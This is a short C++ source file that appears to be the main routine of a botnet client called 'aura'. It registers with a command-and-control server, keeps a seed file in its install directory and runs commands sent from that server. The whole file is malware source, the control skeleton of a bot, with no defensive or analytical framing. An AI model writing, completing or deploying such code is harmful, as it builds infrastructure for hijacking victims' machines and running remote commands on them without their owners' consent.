#include <stdio.h>
#include <fstream>
#include <string>

#include "aura.hh"

int main() {
    std::string registerUrl, cmdUrl, seedPath;

    registerUrl = C2_SERVER + REGISTER_URI;
    cmdUrl = C2_SERVER + CMD_URI;
    seedPath = util::getInstallDir() + SEED_FILE;

    Bot host(seedPath, registerUrl, cmdUrl);

    if (host.isInit()) {
        host.executeCommand();
    } else {
        host.init();
    }

    return 0;
}
